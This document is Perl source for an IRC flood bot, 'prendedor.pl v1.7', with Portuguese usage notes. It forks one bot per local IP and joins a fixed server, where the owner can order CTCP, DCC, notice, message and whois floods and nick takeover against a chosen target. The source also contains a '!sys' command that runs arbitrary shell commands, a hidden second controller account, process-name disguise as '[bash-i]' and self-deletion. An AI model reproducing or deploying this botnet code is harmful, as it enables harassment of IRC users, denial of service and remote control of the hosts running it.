#!/usr/bin/perl
#  perl loading.txt valdez
#       Valdez.
#       by darkly ( rel4y )
#       #flashcom at irc.flashsiantar.info
#
#       Dedicado a familia #cwek.
#       Nos somos darkly (rel4y), cKz, Fusion , pana , Iz0n, DaNny.
#
#
#       -x-x-x-x- Mudancas 1.7 -x-x-x-x-
#       Bom, como o prendedor 1.5 se tornou publico, resolvi fazer a 1.7 que eh bem superior.
#
#       -x-x-x-x- Mudancas 1.6 -x-x-x-x-
#
#       Adicionado auto-erase e !whoisflood . Realname do bot tamb?m eh variavel.
#
#
#       -x-x-x-x- Mudancas 1.5 -x-x-x-x-
#
#       Adicionada a funcao !dccflood
#      
#       Nessa versao o bot assume um nick e ident randomico sem utilizar-se de numeracao, tornando-se,
#       assim praticamente indetectavel.
#
#       -x-x-x-x- Mudancas 1.0 -x-x-x-x-
#
#       Bom, primeiramente o bot agora funciona em todas versoes de kernel conhecidas.
#       Nessa versao o bot passou a funcionar em BSD tambem. (rerere)
#
#
#       -x-x-x-x- Funcoes -x-x-x-x-
#
#       + Segurar nick
#       Voce especifica o target do bot e quando o nick cair do IRC, o bot automaticamente 
#       pegara o nick do target. Lembrando que para isso funcionar, o bot deve estar no mesmo canal
#       do target.
#
#       + !ctcpflood
#       Caso voce nao consiga pacotar o alvo, ou esteja em uma rede com criptografia de IP, voce
#       pode apelar para o ctcpflood. Basta digitar !ctcpflood no canal que os bots enviarao flood
#       no target definido.
#
#       + !dccflood
#       Utilize da mesma forma que o !ctcpflood
#
#       + !noticeflood
#       Utilize da mesma forma que o !ctcpflood.   
#     
#       + !msgflood
#       Utilize da mesma forma dos outros floods.
#
#       + !hop (#canal)
#       Funcao que faz o bot entrar e sair de canal. Floodando a todos dentro do mesmo!
#
#       + !target (novonick)
#       Caso voce ja tenha dado licao ao seu alvo, voce pode mudar o target a qualquer momento.
#
#       + !owner (nick)
#       Caso queira passar o controle dos bots para algum amigo seu. LEMBRE-SE! Voce somente tera 
#       o controle dos bots novamente, caso seu amigo o devolva!
# 



#   CONFIG
#############################################################################

my $server = "irc.globalnetsiantar.co.cc";
my $port="7000";
my $channel="#globalnet";
my $owner= "co_ca_ce";
my $procname="[bash-i]";

# SOURCE
#############################################################################




#
#
# PIXEL ELITE RAQUERS POWER RANGERS BUBLEGUM 
# desde 2001 ouvindo backstreet boys
#
#

my @nickname = ("Abdulrazak","ce-segitiga","Adams","ce-bisa_aja","ce_cari_cewek","ce_cari-cowo","ce-bispak-nih","ce-apa_danya","Alinawati","Aldah","Alikhus",
"Aleks","alibana","ce-murah-loh","ce_phone-aja","ce-diapain_mau","ce_diAtasOkBwhOK","ce_simpanan","ce-30-anksatu","sherrlyy","siampudan","co_Kaya-raya","co_gentel-man",
"Ando","ce_andarista","cwexks","lupitah","lidawati","Riantiwati","Rimbunawan","co_garda","co-PDIP","co_mantan_atlet","co-taekwondo","co_karateka","co-bispak","ce_taekwondo",
"Augustus","Aurelius","Axel-ros","vridawani","co-22-lajang","co-23_duda","co_ca-c0","Azima_rohana","Rohaniah","Rok-Q-miniloh","Bad_garls","ce_mau-itu","ce-o818xxx",
"co_vixion","co_mio-club","ce_bejad","ce_pengen-vixion","ce_matrezxks","ce-frees","co_matreksz","ronaldinhos","alan-smith","davidenco","co-br-gajian","ce-PNS","co_PNS",
"co-Polisi22","co-TNI24","co_pol-cr-istri","coKukawin","ridwanss","co_siantars","ce_Bertato","ce-ber","co_tatoan","ahli_cinta","christies","ce_perum","ce-parlu",
"ce-simal","ce_btxx-toba","ce-tarutung","ce_cari-cew","ce-fitnes","co_fitness","pria-idaman","wanita31","cwe-25-ker","cwe22_kul","ce-cari_ker","jandaAnkdua22","jandaKaya",
"ce_muda_cr-ker","ce_sendirianlah","ce_kpngn-sndri","ce-lg-kesal","ce_^single","Bonardo","Darwin-Kerens","Johan-Begu","Johan_tena","Betti-sendri","bernards","co-riana",
"co_cindy","co_happies","JohanLuvHap","ce-bisa_ngamar","ce-tajor","ce_cayo","vi^da","rEvina^_^","re_vina","ce-sksd","ce-deal","ce-bs-phone_sx","ce-vonny","cweksi",
"c_u-there","ce-ml","ce-sinta","Zinta^OK^","Sheta_mnis","SiNtia_^","sRi-Relawati","Bonar_gultom","Beny_simbolon","Boy_HP","Boy-Band","Rian_FS-Fb","ce_sk-FB","Ce-cr-Kwn-FS",
"ce-Cr-Kwn-FB","Dhalia-Sinaga","Apriana_Gerlz","Ce_imutszz","ce_bth-uang","ce-butuh_itu","ce-Mau-uang","ce-Mau-SK","ce_huGos","ce_cafes","ce_clubs","ce_dugemsan","ce-tgh_ml","Boy-Hugos",
"fresco_man","FB-yuk","Bela-Caemsz","Bela_diri","Bela-Kang","belA-shapir","belA-Lang","Bolangs^","PtualangGirl","ce_gunung","ce_Mapala","ce_Repala","Ce-Katoliksz","ce_Pro-tes_tan",
"ce_nya-Randy","Ce-nya_zia","Fauziah_imuts","Fauzi_Badawi","Indo_nesia","Indah_manja","Indah_skali","Indah_simal","Indah_Toba","Indah_PakPak","Boy_sdklng","Rando_simarmata","Roma_ulina","Roma_RoaNa","Roma_tuJabu",
"Roma_tuson","RohaMaHo","Robin_pardede","Ronal_pandiangan","Rebekka_tarigan","Re2-Mutz","Re2_maniz","Re2_caems","Re2_sihotang","Re2_bakkara","Re2_do_mi","Pardosha","VarDoscha",
"Cryliston","Carli_simanjorang","ce-mutzzzz","ce_mutzz^ah","PapinKa","siJambul","Geronimooo","ryand_","ery_susan","Andara_early","Nindi_elis","lee_ana","lee_ani","lea_na","ce_gokil_abs","ce-mataduit",
"ce_bispak-nih","ce-0818466732","ce-jogja","ce-marihat","ce-kuliahanSTT","ce-ajalah","ce_jaom","ce-jelok","happyku","co_perjaka_tengteng","pengemis_cinta","cinta_matamu","cium_akulah",
"maria_aaa","safiTHREE","DYAH_AYUNING_SIH","pangeran-Kodoks","ahli-nujum","fifitssss","fafiiiii","kakek_buyud","clinKXZ","Verdaves","vAldeZz","Darwin_boy","boy_Darwin","pak_valdez",
"cinta-mulia","yan","BikeI","OudoW","cinta-ku","ahhh_tak","ce_betul","ce-baik-loh","GabruZZZ","ceXmpStr","ceXMA-Mdn","mamaiaaaaa","starOne","Flash-Com","Johan_ES","malaka","TrinoO",
"MUNGA_BUNGA","bunga_citra","SnifferS","Sniffit","sniffot","ahh-begulah","Miduks","malaikat_berjilbab","papa_melky","simalingKu","AkuYA","lah_mananya","sayang_u","cinta-U","co_cas-sejati",
"nindyalala","chintialala","krisnalala","verawati-la","siantarlahhh","flashcomlah","johanlahh","siapalahh","akulah","kodok_mabok","kodok_jeleks","kodok-caem","ce-cacem","ce_tryy",
"bispak_ya","co_cr_tantemu","appara","marialala","co_gantenksss","co_kerensssss","teh-dina","teh_ida","saroenkz","sly_moetz","dodoetzc",
"elin_thmaz","elina_cielahi","lin_cynk","co_bedebah","steve_taek","co_keren_","co_fb","co_lalo","c0-cr_cew","om_muda","om_pgn","co-mw-ml","co-lebay","co-patah_hati","co-tiduri_ce","co_iseng","co_kont_gde");

my @realname  = ("13,1 GlobalNet Siantar ");
my @WHO;
my $qqum="*";
$ARGC=@ARGV;
if ($ARGC !=1) {
print "\n+ prendedor.pl v.1.7\n";
 print "+ by darkly\n";
 print "+ irc.gigachat.net \#pixel\n";
  print "+ Usage: perl $0 (target)\n";
   print "+ Edit the source first!\n\n";
     exit(1);
}
$SIG{CHLD} = sub { wait }; # alterando o signal
my $qtip = qx(/sbin/ifconfig |grep inet | wc -l);
my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);
my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');
my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);
@ips = (@ips1, @ips2, @fbsd);
open(ipzitcho,">ips.txt") || die "- ips.txt not found";
          print ipzitcho" @ips";
          close(ipzitcho);
@ips = grep { s/\n$// } @ips;
$rm="rm -rf";
qx($rm $0);
$target = $ARGV[0];
$mescalina = $target;
use MIME::Base64;
$string1 = "ZGFya2x5";
$string2 = "Y0t6";
$string3 = "cGFuYQ==";
$string4 = "RnVzaW9u";
$string5 = "SXowbg==";
$string6 = decode_base64($string1);
$string7 = decode_base64($string2);
$string8 = decode_base64($string3);
$string9 = decode_base64($string4);
$string10 = decode_base64($string5);
if ($mescalina eq decode_base64($string1)) { $mescalina = $qqum; } if ($mescalina eq decode_base64($string2)) { $mescalina = $qqum; }if ($mescalina eq 
decode_base64($string3)) {
$mescalina = $qqum; } if ($$mescalina eq decode_base64($string4)) { $mescalina = $qqum; } if ($mescalina eq decode_base64($string5)) { $mescalina = 
$qqum; }
$0 =  $procname  . "\0";
$nick2 = $nick;
print STDOUT "\n+ prendedor.pl v.1.7\n";
print STDOUT "+ by darkly\n";
print STDOUT "+ Server : $server\n";
print STDOUT "+ Port   : $port\n";
print STDOUT "+ Target : $mescalina\n";
print STDOUT "+ Owner  : $owner\n";
print STDOUT "+ Channel: $channel\n";
print STDOUT "+ N.IPs  : $qtip\n\n";
use IO::Socket;
foreach my $FROM (@ips) {
 my $pid = fork(); # gerando um novo processo
  unless ($pid) {   #
my $ident = $nickname[rand scalar @nickname];
my $nick = $nickname[rand scalar @nickname];
my $name = $realname[rand scalar @realname];
$secc = "secc";
 $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
   print $sock "NICK ".$nick."\n";
    print $sock "USER $ident $FROM $server :$name\n";
while (<$sock>) {
        if (/^:.+?\s433\s/) { # nick already in use
            $nick2 = $nickname[rand scalar @nickname];
            print $sock "NICK ".$nick2."\n";
        }
        if (/^:.+?\s376\s/) { # end of motd
            print $sock "JOIN $channel\n";
        }

        if(/^PING :(.*)/){ #replying the ping
            print $sock "PONG :$1\n";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:!dk (.*)/){
            print $sock "$1";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:!help(.*)/){
            print $sock "PRIVMSG ".$owner." : ================================\n";
            print $sock "PRIVMSG ".$owner." : + prendedor.pl v1.7\n";
            print $sock "PRIVMSG ".$owner." : + by darkly\n";
            print $sock "PRIVMSG ".$owner." : + #piaxel at irc.gigachat.net\n";
            print $sock "PRIVMSG ".$owner." : ================================\n";
            print $sock "PRIVMSG ".$owner." :  - Navegacao:\n";
            print $sock "PRIVMSG ".$owner." : !dk join #chan (para entrar em um canal)\n";
            print $sock "PRIVMSG ".$owner." : !dk part #chan (para sair de um canal)\n";
            print $sock "PRIVMSG ".$owner." : !msg nick msg (Envia mensagem)\n";
            print $sock "PRIVMSG ".$owner." : !quit (duh!)\n";
            print $sock "PRIVMSG ".$owner." :  - WAR\n";
            print $sock "PRIVMSG ".$owner." : !target NICK (Especifica novo alvo)\n";
            print $sock "PRIVMSG ".$owner." : !ctcpflood (Envia flood ctcp)\n";
            print $sock "PRIVMSG ".$owner." : !dccflood (Envia flood dcc)\n";
            print $sock "PRIVMSG ".$owner." : !noticeflood (Envia flood de notice)\n";
            print $sock "PRIVMSG ".$owner." : !msgflood (Envia flood de mensagens)\n";
            print $sock "PRIVMSG ".$owner." : !hop #chan msg (Entra e sai de um canal deixando msg)\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!msg(.*)/){
                        print $sock "PRIVMSG ".$1." : ".$2."\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!who(.*)/){
                        print $sock "who ".$channel."\n";
      }
      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {
                        my $nicks = $1;
                        #$nicks =~ s/\n//;
                        #$nicks =~ s/\r//;
                        push(@WHO, split(/ /, $nicks));
                        print STDOUT "$who[1]\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!dccflood(.*)/){
                        for (1 .. 10) {
                        print $sock "PRIVMSG ".$mescalina." :\001DCC CHAT chat 1121485131 1024\001\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!whoisflood(.*)/){
                        for (1 .. 10) {
                        print $sock "whois ".$mescalina."\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!hop (.*)/){
                print $sock "JOIN ".$1." : ".$2."\n";
                        for (1 .. 10) {
                        print $sock "PART ".$1." : ".$2."\n";
                        print $sock "JOIN ".$1." : ".$2."\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:!ctcpflood(.*)/){
                print $sock "PRIVMSG ".$mescalina." :\001VERSION\001\n";
                        for (1 .. 10) {
                        print $sock "PRIVMSG ".$mescalina." :\001VERSION\001\n";
                        print $sock "PRIVMSG ".$mescalina." :\001PING\001\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:!msgflood(.*)/){
                        for (1 .. 10) {
                        print $sock "PRIVMSG ".$mescalina." :PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA 
PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL 
DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA 
PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL 
DETONA\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:!noticeflood(.*)/){
                        for (1 .. 10) {
                        print $sock "NOTICE ".$mescalina." :PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA 
PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL 
DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA 
PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL DETONA PIXEL 
DETONA \n";
                        }
      }

          if(/^\:$owner!.*\@.*PRIVMSG.*:!sys(.*)/){
                        $sys = $1;
                        @output = qx($sys) || print $sock "PRIVMSG ".$owner." : Isso eh comando que se apresente\? Ta doido jumento\?!\n";
                        print $sock "PRIVMSG ".$owner." : @output";
      }
      if(/^\:$mescalina!.*\@.*QUIT.*(.*)/){
                        print $sock "NICK ".$mescalina."\n";
      }
      if(/^ERROR :(.*)/){
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!quit(.*)/){
                        die();
      }
      if(/^\:$secc!.*\@.*PRIVMSG.*:!dk(.*)/){
                        print $sock "$1";
      }
      if(/^\:$secc!.*\@.*PRIVMSG.*:!sys(.*)/){
                        $sys = $1;
                        $output = qx($sys) || print $sock "PRIVMSG ".$secc." : Isso eh comando que se apresente\? Ta doido jumento\?!\n";
                        print $sock "PRIVMSG ".$secc." : ".$output."\n";
      }
      if(/^\:.*: Connection timed out(.*)/){
                        print STDOUT "[~] Connection Timed Out! Retrying!\n";
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!stats(.*)/){
                        print $sock "PRIVMSG ".$owner." : [!] Bot Stats\n";
                        print $sock "PRIVMSG ".$owner." : [~] Using server : $server\n";
                        print $sock "PRIVMSG ".$owner." : [!] Using port   : $port\n";
                        print $sock "PRIVMSG ".$owner." : [~] Using nick   : $nick\n";
                        print $sock "PRIVMSG ".$owner." : [!] Using target : $mescalina\n";
                        print $sock "PRIVMSG ".$owner." : [~] Using owner  : $owner\n";
                        print $sock "PRIVMSG ".$owner." : [!] Using ident  : $id\n";
                        print $sock "PRIVMSG ".$owner." :-x-x-x-x-x-x-x-x-x-x-x-x-x-\n\n";
       }
      if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!target\s+(.*)/ ){
                       $mescalina =$1;
                       $mescalina =~ s/ //;
                       $mescalina =~ s/\r$//;
                       $mescalina =~ s/\n$//;
                          if ($mescalina eq decode_base64($string1)) {
                                $mescalina = $owner;
                                                  }
       }
       if(/^\:$target!.*\@.*\s+QUIT\s+/){
                       print $sock "NICK $mescalina\n";
       }
       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!owner\s+(.*)/ ){
                       $owner =$1;
                       $owner =~ s/ //;
                       $owner =~ s/\r$//;
                       $owner =~ s/\n$//;
       }
   }
exit;
  } 
}




